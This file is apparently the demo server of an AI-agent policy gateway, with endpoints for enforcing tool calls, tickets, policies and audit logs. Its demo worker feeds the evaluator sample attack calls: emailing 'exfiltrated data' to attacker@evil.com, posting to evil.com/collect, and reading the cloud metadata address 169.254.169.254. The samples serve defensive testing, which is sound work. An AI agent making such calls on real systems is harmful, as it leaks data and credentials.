// Demo server — runs without Firebase using local JSON store
import Fastify from 'fastify'
import { readFileSync, existsSync } from 'fs'
import { resolve } from 'path'
import { createRequire } from 'module'
import { getDemoDb, seedDemo } from './lib/demo-store.js'
import { sign, verify } from './lib/jwt.js'
import { generateId } from './lib/crypto.js'
import { verifyPassword } from './lib/password.js'
import { validateEnv } from './lib/env.js'

// Validate environment (skip Firebase since demo mode doesn't need it)
validateEnv({ skipFirebase: true })

const require = createRequire(import.meta.url)
const { evaluateIntent } = require('../netlify/functions/src/engine/evaluator.js')

const db = getDemoDb()
seedDemo(db)
const app = Fastify({ logger: false })

const DEFAULT_ORG_ID = process.env.DEFAULT_ORG_ID!

// Request ID
app.addHook('onRequest', async (request: any) => { request.requestId = generateId('req_', 8) })
// CORS
app.addHook('onRequest', async (_req: any, reply: any) => {
  reply.header('Access-Control-Allow-Origin', '*')
  reply.header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS')
  reply.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Agent-Key')
  if (_req.method === 'OPTIONS') { reply.code(204).send(); return }
})

// Auth
async function requireAuth(request: any, reply: any): Promise<any> {
  const header = (request.headers.authorization || '') as string
  const token = header.startsWith('Bearer ') ? header.substring(7) : null
  if (!token) { reply.code(401).send({ error: { code: 'unauthorized', message: 'missing token' } }); return null }
  const claims = verify(token)
  if (!claims) { reply.code(401).send({ error: { code: 'unauthorized', message: 'invalid token' } }); return null }
  return claims
}

function err(reply: any, code: number, cat: string, msg: string) {
  reply.code(code); return { error: { code: cat, message: msg } }
}

// ==================== ENDPOINTS ====================

// POST /enforce — 11-step evaluator
app.post('/enforce', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const { intent } = (req.body || {}) as any
  if (!intent?.intentId || !intent?.tool || !intent?.agentId) return err(reply, 400, 'validation', 'intentId, agentId, tool required')
  const agentSnap = await db.collection('agents').doc(intent.agentId).get()
  if (!agentSnap.exists) return err(reply, 401, 'agent_not_found', 'agent not found')
  const agent = agentSnap.data() as any
  if (agent.status !== 'active') return { decision: 'deny', reason: 'agent_' + agent.status, violatedRule: 'agent_status' }
  const polSnap = await db.collection('policies').get()
  const policies = polSnap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() as any })).filter(p => p.status === 'active').sort((a, b) => (a.priority || 999) - (b.priority || 999))
  const decision = evaluateIntent({ intent: { tool: intent.tool, parameters: intent.parameters || {} }, agentStatus: 'active', policies, sessionCost: null, dailyCost: null, toolCost: null })
  const resp: any = { decision: decision.decision, intentId: intent.intentId, decidedAt: new Date().toISOString() }
  if (decision.reason) { resp.reason = decision.reason; resp.violatedRule = decision.violatedRule }
  if (resp.decision === "allow" || resp.decision === "modify") resp.gatewayTicket = "gtk_" + generateId("gtk_", 20)
  return resp
})

// POST /gateway/execute
app.post('/gateway/execute', async (req: any, reply: any) => {
  const { gatewayTicket, action } = (req.body || {}) as any
  if (!gatewayTicket || !action?.tool) return err(reply, 400, 'validation', 'gatewayTicket and action required')
  const key = gatewayTicket.substring(0, 40)
  const used = await db.collection('gatewayTickets').doc(key).get()
  if (used.exists) return err(reply, 403, 'ticket_replayed', 'ticket already used')
  await db.collection('gatewayTickets').doc(key).set({ usedAt: new Date().toISOString(), tool: action.tool })
  return { executed: true, result: { status: 'ok' }, latencyMs: 1 }
})

// POST /auth/login
app.post('/auth/login', async (req: any, reply: any) => {
  const { email, password } = (req.body || {}) as any
  if (!email || !password) return err(reply, 400, 'validation', 'email and password required')
  const snap = await db.collection('users').doc(email).get()
  if (!snap.exists) return err(reply, 401, 'unauthorized', 'invalid credentials')
  const userData = snap.data() as any
  let authenticated = false
  if (userData.passwordHash && userData.passwordSalt) {
    authenticated = verifyPassword(password, userData.passwordHash, userData.passwordSalt)
  }
  if (!authenticated) return err(reply, 401, 'unauthorized', 'invalid credentials')
  return { token: sign({ sub: email, role: 'org_admin' }), user: { email, role: 'org_admin' } }
})

// POST /task
app.post('/task', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const { payload } = (req.body || {}) as any
  if (!payload) return err(reply, 400, 'validation', 'payload required')
  const ref = db.collection('tasks').doc()
  await ref.set({ payload, status: 'pending', createdAt: new Date().toISOString(), orgId: DEFAULT_ORG_ID })
  await db.collection('logs').doc('log_' + ref.id + '_create').set({ taskId: ref.id, tool: 'task.created', decision: 'allow', reason: 'task submitted to queue', timestamp: new Date().toISOString() })
  return { id: ref.id, payload, status: 'pending' }
})

// GET /task/:id
app.get('/task/:id', async (req: any, reply: any) => {
  const snap = await db.collection('tasks').doc(req.params.id).get()
  if (!snap.exists) return err(reply, 404, 'not_found', 'task not found')
  return { id: snap.id, ...snap.data() }
})

// GET /agents
app.get('/agents', async () => {
  const snap = await db.collection('agents').get()
  return { data: snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() })) }
})

// GET /metrics
app.get('/metrics', async () => {
  const snap = await db.collection('tasks').get()
  const tasks = snap.docs.filter(d => d.exists).map(d => d.data() as any)
  const agents = await db.collection('agents').get()
  return {
    tasks: { total: tasks.length, pending: tasks.filter(t => t.status === 'pending').length, active: tasks.filter(t => t.status === 'running').length, completed: tasks.filter(t => t.status === 'completed').length, failed: tasks.filter(t => t.status === 'failed').length },
    runs: { active: 0 }, agents: { active: agents.docs.filter(d => d.exists && (d.data() as any).status === 'active').length }, avgDurationMs: 0,
  }
})

// GET /diagnostics
app.get('/diagnostics', async () => ({
  status: 'healthy', mode: 'demo', firestore: { connected: false, usingLocalStore: true },
  config: { environment: 'demo', jwtConfigured: true }, checkedAt: new Date().toISOString(),
  collections: { tasks: { accessible: true, count: (await db.collection('tasks').get()).docs.filter(d => d.exists).length } },
}))

// GET /audit/timeline
app.get('/audit/timeline', async () => {
  const snap = await db.collection('logs').get()
  const logs = snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() as any }))
  logs.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())
  return { timeline: logs }
})

// GET /security/ping
app.get('/security/ping', async (req: any) => {
  const claims = verify((req.headers.authorization || '').replace('Bearer ', ''))
  return { authenticated: !!claims, mode: 'demo' }
})

// POST /orgs
app.post('/orgs', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const { name, email } = (req.body || {}) as any
  if (!name || !email) return err(reply, 400, 'validation', 'name and email required')
  const id = 'org_' + Date.now().toString(36)
  await db.collection('orgs').doc(id).set({ id, name, email, plan: 'free', createdAt: new Date().toISOString() })
  await db.collection('agents').doc('agent_' + id).set({ id: 'agent_' + id, name: name + ' Bot', model: 'gpt-4o', provider: 'openai', orgId: id, status: 'active', registeredAt: new Date().toISOString(), capabilities: ['task:execute'] })
  return { id, name, email, agentId: 'agent_' + id }
})

// GET /orgs
app.get('/orgs', async () => {
  const snap = await db.collection('orgs').get()
  return { data: snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() })) }
})

// POST /agents/register
app.post('/agents/register', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const { name, model, provider } = (req.body || {}) as any
  if (!name || !model || !provider) return err(reply, 400, 'validation', 'name, model, provider required')
  const id = 'agent_' + Date.now().toString(36)
  const pn = 'PP-' + Math.random().toString(16).substring(2, 6).toUpperCase() + '-' + Math.random().toString(16).substring(2, 6).toUpperCase()
  await db.collection('agents').doc(id).set({ id, name, model, provider, orgId: DEFAULT_ORG_ID, status: 'active', passport: { passportNumber: pn, systemPromptHash: 'sha256:demo' }, registeredAt: new Date().toISOString(), capabilities: ['task:execute', 'network:http'] })
  return { agentId: id, passportNumber: pn, secretKey: 'ak_live_demo_' + id, secretKeyPrefix: 'ak_live_demo' }
})

// POST /policies
app.post('/policies', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const body = (req.body || {}) as any
  if (!body.name || !body.rules) return err(reply, 400, 'validation', 'name and rules required')
  const id = 'pol_' + Date.now().toString(36)
  await db.collection('policies').doc(id).set({ id, name: body.name, orgId: DEFAULT_ORG_ID, status: 'active', priority: body.priority || 10, scope: body.scope || { agentId: '*', environment: ['*'] }, rules: body.rules, createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() })
  return { id, name: body.name }
})

// GET /templates
app.get('/templates', async () => {
  const { listTemplates, TEMPLATES } = await import('./lib/policy-templates.js')
  return { templates: TEMPLATES.map(t => ({ name: t.name, description: t.description, scenario: t.scenario })) }
})

// POST /templates/apply
app.post('/templates/apply', async (req: any, reply: any) => {
  if (!(await requireAuth(req, reply))) return
  const { templateName } = (req.body || {}) as any
  if (!templateName) return err(reply, 400, 'validation', 'templateName required')
  const { findTemplate } = await import('./lib/policy-templates.js')
  const tmpl = findTemplate(templateName)
  if (!tmpl) return err(reply, 404, 'not_found', 'template not found')
  const id = 'pol_tmpl_' + Date.now().toString(36)
  await db.collection('policies').doc(id).set({ id, name: tmpl.name, orgId: DEFAULT_ORG_ID, status: 'active', priority: 10, scope: { agentId: '*', environment: ['*'] }, rules: tmpl.rules, createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() })
  return { id, name: tmpl.name, message: 'Template applied as policy' }
})

// GET /report
app.get('/report', async () => {
  const snap = await db.collection('tasks').get()
  const tasks = snap.docs.filter(d => d.exists).map(d => d.data() as any)
  return { summary: { totalTasks: tasks.length, completed: tasks.filter(t => t.status === 'completed').length, failed: tasks.filter(t => t.status === 'failed').length, pending: tasks.filter(t => t.status === 'pending').length } }
})

// GET /health
app.get('/health', async () => {
  const snap = await db.collection('tasks').get()
  const tasks = snap.docs.filter(d => d.exists).map(d => d.data() as any)
  const stuck = tasks.filter(t => t.status === 'running').length
  const failed = tasks.filter(t => t.status === 'failed').length
  const pending = tasks.filter(t => t.status === 'pending').length
  const status = stuck > 0 ? 'DEGRADED' : failed > 5 ? 'DEGRADED' : pending > 20 ? 'STALLED' : 'HEALTHY'
  return { status, summary: status === 'HEALTHY' ? 'All queues clear' : `${stuck} stuck, ${failed} failed, ${pending} pending`, indicators: { stuckTasks: stuck, failedTasks: failed, pendingTasks: pending } }
})

// GET /explain/:id
app.get('/explain/:id', async (req: any) => {
  const snap = await db.collection('logs').get()
  const logs = snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() as any })).filter(l => l.taskId === req.params.id || l.runId === req.params.id).sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime())
  if (logs.length === 0) return { id: req.params.id, explainable: false, message: 'No execution logs found. Execute a task first.' }
  return { id: req.params.id, explainable: true, executionPath: logs.map((l, i) => ({ step: i + 1, timestamp: l.timestamp, tool: l.tool, decision: l.decision, reason: l.reason || '(system)', decisionPath: l.decision === 'allow' ? '→ policy matched → permit' : '→ policy violated → block' })), summary: { totalSteps: logs.length, allowed: logs.filter(l => l.decision === 'allow').length, denied: logs.filter(l => l.decision === 'deny').length } }
})

// Worker
async function demoWorker() {
  try {
    const snap = await db.collection('tasks').get()
    const pending = snap.docs.filter(d => d.exists).map(d => ({ id: d.id, ...d.data() as any })).filter(t => t.status === 'pending')
    if (pending.length === 0) return
    const task = pending[0]; const now = new Date().toISOString()
    await db.collection('tasks').doc(task.id).update({ status: 'running', startedAt: now })
    const runId = 'run_' + Date.now().toString(36)
    await db.collection('runs').doc(runId).set({ id: runId, agentId: 'agent_demo', taskId: task.id, status: 'running', startedAt: now, sessionId: 'sess_' + runId, totalActions: 0, allowedActions: 0, deniedActions: 0 })
    const polSnap = await db.collection('policies').doc('policy_demo').get()
    const policy = polSnap.exists ? { id: polSnap.id, ...polSnap.data() as any } : null
    const policies = policy ? [policy] : []
    const calls = [
      { tool: 'lookup_order', parameters: { orderId: 'ORD-42' } },
      { tool: 'check_inventory', parameters: { sku: 'SKU-8821' } },
      { tool: 'send_email', parameters: { to: 'attacker@evil.com', body: 'exfiltrated data' } },
      { tool: 'http_request', parameters: { url: 'https://evil.com/collect', method: 'POST' } },
      { tool: 'http_request', parameters: { url: 'http://169.254.169.254/latest/meta-data', method: 'GET' } },
      { tool: 'lookup_order', parameters: { orderId: '1', ssn: '123-45-6789' } },
    ]
    for (let i = 0; i < calls.length; i++) {
      await new Promise(r => setTimeout(r, 150))
      const d = evaluateIntent({ intent: { tool: calls[i].tool, parameters: calls[i].parameters }, agentStatus: 'active', policies, sessionCost: null, dailyCost: null, toolCost: null })
      await db.collection('logs').doc('log_' + runId + '_' + i).set({ runId, taskId: task.id, agentId: 'agent_demo', tool: calls[i].tool, decision: d.decision, reason: d.reason || 'policy evaluation', parameters: calls[i].parameters, timestamp: new Date().toISOString() })
    }
    const logSnap = await db.collection('logs').get()
    const runLogs = logSnap.docs.filter(d => d.exists).map(d => d.data() as any).filter(l => l.runId === runId)
    const end = new Date().toISOString()
    await db.collection('runs').doc(runId).update({ status: 'completed', endedAt: end, totalActions: runLogs.length, allowedActions: runLogs.filter(l => l.decision === 'allow').length, deniedActions: runLogs.filter(l => l.decision === 'deny').length })
    await db.collection('tasks').doc(task.id).update({ status: 'completed', completedAt: end })
  } catch (e: any) {}
}

// GET /
app.get('/', async (_req: any, reply: any) => { reply.header('Content-Type', 'text/html'); return renderDashboard() })

// Static files
app.get('/*', async (request: any, reply: any) => {
  const url = (request.url || '/').split('?')[0]
  const files = ['index.html', 'landing.html', 'operator.html', 'admin-portal.html', 'agents.html', 'dev-dashboard.html', 'verify-demo.html', 'sdk-demo.html', 'tutorial.html', 'tui-tutorial.html', 'metrics.html', 'architecture.html']
  if (files.includes(url.substring(1))) {
    try {
      const path = resolve(process.cwd(), url.substring(1))
      if (existsSync(path)) { reply.header('Content-Type', 'text/html'); return readFileSync(path, 'utf-8') }
    } catch {}
  }
  reply.code(404).send({ error: { code: 'not_found', message: 'Route not found' } })
})

// Start
const PORT = parseInt(process.env.PORT || '3000', 10)
app.listen({ port: PORT }, (e: any) => {
  if (e) { console.error('Start failed:', e.message); process.exit(1) }
  console.log('\n  ⚡ Demo mode — no Firebase required')
  console.log('  → http://localhost:' + PORT)
  console.log('  → Terminal TUI:  npm run tui  (in another terminal)')
  setInterval(demoWorker, 3000)
  demoWorker()
  console.log('  → Worker: processing tasks automatically\n')
})
